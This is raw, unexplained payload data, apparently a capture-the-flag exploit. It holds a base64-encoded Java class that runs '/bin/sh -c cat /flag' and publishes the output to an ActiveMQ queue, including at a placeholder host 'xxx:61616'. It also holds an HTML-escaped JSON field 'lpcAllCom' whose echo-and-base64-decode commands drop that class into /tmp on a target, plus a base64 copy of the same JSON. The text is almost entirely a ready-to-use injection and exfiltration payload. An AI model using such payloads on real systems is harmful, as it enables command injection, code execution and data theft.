cy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw= 1&#123;&quot;lpcAllCom&quot;:[&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;,&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;]&#125; 1eyJscGNBbGxDb20iOlsiZWNobyB5djY2dmdBQUFEUUF3UW9BTVFCZEJ3QmVDQUJmQ2dBQ0FHQUxBR0VBWWdjQVl3c0FaQUJsQ0FCbUN3QUdBR2NMQUFZQWFBY0FhUWdBYWdnQWF3Z0FiQWNBYlFjQWJnb0FFQUJ2Q2dBUUFIQUtBSEVBY2dvQUR3QnpDQUIwQ2dBUEFIVUtBQThBZGdvQUN3QjNDZ0FMQUhnTEFBWUFlUXNBTEFCNkN3QjdBSHdKQUgwQWZnZ0Fmd29BZ0FDQkN3QmtBSUlJQUlNTEFBWUFoQXNBaFFDR0N3QmtBSWNIQUlnS0FDVUFYUW9BSlFDSkJ3Q0tDZ0FvQUYwSUFJc0tBQ2dBakFjQWpRc0FMQUNPQ2dBb0FJOEhBSkFLQUM4QWtRY0FrZ2NBa3dFQUJqeHBibWwwUGdFQUF5Z3BWZ0VBQkVOdlpHVUJBQTlNYVc1bFRuVnRZbVZ5VkdGaWJHVUJBQkpNYjJOaGJGWmhjbWxoWW14bFZHRmliR1VCQUFSMGFHbHpBUUFHVEUxaGFXNDdBUUFIY0hWaWJHbHphQUVBQjJaaFkzUnZjbmtCQUIxTWFtRjJZWGd2YW0xekwwTnZibTVsWTNScGIyNUdZV04wYjNKNU93RUFDbU52Ym01bFkzUnBiMjRCQUJaTWFtRjJZWGd2YW0xekwwTnZibTVsWTNScGIyNDdBUUFLY0hWaVUyVnpjMmx2YmdFQUUweHFZWFpoZUM5cWJYTXZVMlZ6YzJsdmJqc0JBQVZ4ZFdWMVpRRUFFVXhxWVhaaGVDOXFiWE12VVhWbGRXVTdBUUFKY0hWaWJHbHphR1Z5QVFBYlRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFVISnZaSFZqWlhJN0FRQURZMjFrQVFBVFcweHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFBbUp6QVFBQ1cwSUJBQWR0WlhOellXZGxBUUFTVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRGJYTm5BUUFYVEdwaGRtRjRMMnB0Y3k5VVpYaDBUV1Z6YzJGblpUc0JBQXBGZUdObGNIUnBiMjV6QVFBSFkyOXVjM1Z0WlFFQUNuTjFZbE5sYzNOcGIyNEJBQXB6ZFdKelkzSnBZbVZ5QVFBYlRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFEyOXVjM1Z0WlhJN0FRQUViV0ZwYmdFQUZpaGJUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVllCQUFSaGNtZHpBUUFKYjI1TlpYTnpZV2RsQVFBV0tFeHFZWFpoZUM5cWJYTXZUV1Z6YzJGblpUc3BWZ0VBQVdVQkFCVk1hbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZianNCQUJOTWFtRjJZWGd2YW0xekwwMWxjM05oWjJVN0FRQU5VM1JoWTJ0TllYQlVZV0pzWlFFQUNsTnZkWEpqWlVacGJHVUJBQWxOWVdsdUxtcGhkbUVNQURNQU5BRUFMVzl5Wnk5aGNHRmphR1V2WVdOMGFYWmxiWEV2UVdOMGFYWmxUVkZEYjI1dVpXTjBhVzl1Um1GamRHOXllUUVBRlhSamNEb3ZMekV5Tnk0d0xqQXVNVG8yTVRZeE5nd0FNd0NVQndDVkRBQ1dBSmNCQUJGcVlYWmhlQzlxYlhNdlUyVnpjMmx2YmdjQW1Bd0FtUUNhQVFBSlpteGhaM0YxWlhWbERBQ2JBSndNQUowQW5nRUFFR3BoZG1FdmJHRnVaeTlUZEhKcGJtY0JBQWN2WW1sdUwzTm9BUUFDTFdNQkFBbGpZWFFnTDJac1lXY0JBQkZxWVhaaEwzVjBhV3d2VTJOaGJtNWxjZ0VBR0dwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56UW5WcGJHUmxjZ3dBTXdCVERBQ2ZBS0FIQUtFTUFLSUFvd3dBTXdDa0FRQUNYRUVNQUtVQXBnd0Fwd0NvREFDcEFLb01BRE1BcXd3QXJBQ3REQUN1QUpRSEFLOE1BTEFBVmdjQXNRd0FzZ0N6QVFBUWNIVmliR2x6YUNCbWFXNXBjMmhsWkFjQXRBd0F0UUNVREFDMkFEUUJBQTkwWTNBNkx5OTRlSGc2TmpFMk1UWU1BTGNBdUFjQXVRd0F1Z0M3REFDZkFEUUJBQVJOWVdsdURBQTZBRFFCQUJkcVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjZ0VBQ1ZKbFkyVnBkbVZrSUF3QXZBQzlBUUFWYW1GMllYZ3ZhbTF6TDFSbGVIUk5aWE56WVdkbERBQytBS2dNQUw4QXFBRUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRNQU1BQU5BRUFFR3BoZG1FdmJHRnVaeTlQWW1wbFkzUUJBQmxxWVhaaGVDOXFiWE12VFdWemMyRm5aVXhwYzNSbGJtVnlBUUFWS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsV0FRQWJhbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjVHWVdOMGIzSjVBUUFRWTNKbFlYUmxRMjl1Ym1WamRHbHZiZ0VBR0NncFRHcGhkbUY0TDJwdGN5OURiMjV1WldOMGFXOXVPd0VBRkdwaGRtRjRMMnB0Y3k5RGIyNXVaV04wYVc5dUFRQU5ZM0psWVhSbFUyVnpjMmx2YmdFQUZ5aGFTU2xNYW1GMllYZ3ZhbTF6TDFObGMzTnBiMjQ3QVFBTFkzSmxZWFJsVVhWbGRXVUJBQ1VvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhlQzlxYlhNdlVYVmxkV1U3QVFBT1kzSmxZWFJsVUhKdlpIVmpaWElCQURRb1RHcGhkbUY0TDJwdGN5OUVaWE4wYVc1aGRHbHZianNwVEdwaGRtRjRMMnB0Y3k5TlpYTnpZV2RsVUhKdlpIVmpaWEk3QVFBRmMzUmhjblFCQUJVb0tVeHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQkZxWVhaaEwyeGhibWN2VUhKdlkyVnpjd0VBRG1kbGRFbHVjSFYwVTNSeVpXRnRBUUFYS0NsTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc0JBQmdvVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0tWWUJBQXgxYzJWRVpXeHBiV2wwWlhJQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwzVjBhV3d2VTJOaGJtNWxjanNCQUFSdVpYaDBBUUFVS0NsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBaG5aWFJDZVhSbGN3RUFCQ2dwVzBJQkFBVW9XMElwVmdFQUVXTnlaV0YwWlZSbGVIUk5aWE56WVdkbEFRQVpLQ2xNYW1GMllYZ3ZhbTF6TDFSbGVIUk5aWE56WVdkbE93RUFCM05sZEZSbGVIUUJBQmxxWVhaaGVDOXFiWE12VFdWemMyRm5aVkJ5YjJSMVkyVnlBUUFFYzJWdVpBRUFFR3BoZG1FdmJHRnVaeTlUZVhOMFpXMEJBQU52ZFhRQkFCVk1hbUYyWVM5cGJ5OVFjbWx1ZEZOMGNtVmhiVHNCQUJOcVlYWmhMMmx2TDFCeWFXNTBVM1J5WldGdEFRQUhjSEpwYm5Sc2JnRUFCV05zYjNObEFRQU9ZM0psWVhSbFEyOXVjM1Z0WlhJQkFEUW9UR3BoZG1GNEwycHRjeTlFWlhOMGFXNWhkR2x2YmpzcFRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFEyOXVjM1Z0WlhJN0FRQVphbUYyWVhndmFtMXpMMDFsYzNOaFoyVkRiMjV6ZFcxbGNnRUFFbk5sZEUxbGMzTmhaMlZNYVhOMFpXNWxjZ0VBSGloTWFtRjJZWGd2YW0xekwwMWxjM05oWjJWTWFYTjBaVzVsY2pzcFZnRUFCbUZ3Y0dWdVpBRUFMU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWRDZFdsc1pHVnlPd0VBQjJkbGRGUmxlSFFCQUFoMGIxTjBjbWx1WndFQUQzQnlhVzUwVTNSaFkydFVjbUZqWlFBaEFDVUFNUUFCQURJQUFBQUZBQUVBTXdBMEFBRUFOUUFBQUM4QUFRQUJBQUFBQlNxM0FBR3hBQUFBQWdBMkFBQUFCZ0FCQUFBQUJRQTNBQUFBREFBQkFBQUFCUUE0QURrQUFBQUNBRG9BTkFBQ0FEVUFBQUZlQUFVQUNnQUFBSnE3QUFKWkVnTzNBQVJNSzdrQUJRRUFUU3dEQkxrQUJ3TUFUaTBTQ0xrQUNRSUFPZ1F0R1FTNUFBb0NBRG9GQnIwQUMxa0RFZ3hUV1FRU0RWTlpCUklPVXpvR3V3QVBXYnNBRUZrWkJyY0FFYllBRXJZQUU3Y0FGQklWdGdBV3RnQVh0Z0FZT2dlN0FBdFpHUWUzQUJrNkNDMjVBQm9CQURvSkdRa1pDTGtBR3dJQUdRVVpDYmtBSEFJQXNnQWRFaDYyQUI4c3VRQWdBUUN4QUFBQUFnQTJBQUFBUmdBUkFBQUFDQUFLQUFrQUVRQUtBQm9BQ3dBa0FBd0FMZ0FOQUVNQURnQmJBQThBWGdBUUFHRUFFUUJtQUJJQWNRQVRBSGtBRkFDQ0FCVUFpd0FXQUpNQUZ3Q1pBQmdBTndBQUFHWUFDZ0FBQUpvQU9BQTVBQUFBQ2dDUUFEc0FQQUFCQUJFQWlRQTlBRDRBQWdBYUFJQUFQd0JBQUFNQUpBQjJBRUVBUWdBRUFDNEFiQUJEQUVRQUJRQkRBRmNBUlFCR0FBWUFaZ0EwQUVjQVNBQUhBSEVBS1FCSkFFb0FDQUI1QUNFQVN3Qk1BQWtBVFFBQUFBUUFBUUF2QUFJQVRnQTBBQUlBTlFBQUFMVUFBd0FHQUFBQVBic0FBbGtTSWJjQUJFd3J1UUFGQVFCTkxBTUV1UUFIQXdCT0xSSUl1UUFKQWdBNkJDMFpCTGtBSWdJQU9nVVpCU3E1QUNNQ0FDeTVBQ1FCQUxFQUFBQUNBRFlBQUFBaUFBZ0FBQUFiQUFvQUhBQVJBQjBBR2dBZUFDUUFId0F1QUNBQU5nQWhBRHdBSWdBM0FBQUFQZ0FHQUFBQVBRQTRBRGtBQUFBS0FETUFPd0E4QUFFQUVRQXNBRDBBUGdBQ0FCb0FJd0JQQUVBQUF3QWtBQmtBUVFCQ0FBUUFMZ0FQQUZBQVVRQUZBRTBBQUFBRUFBRUFMd0FKQUZJQVV3QUNBRFVBQUFCSkFBSUFBZ0FBQUEyN0FDVlp0d0FtVEN1M0FDZXhBQUFBQWdBMkFBQUFEZ0FEQUFBQUpnQUlBQ2NBREFBb0FEY0FBQUFXQUFJQUFBQU5BRlFBUmdBQUFBZ0FCUUJT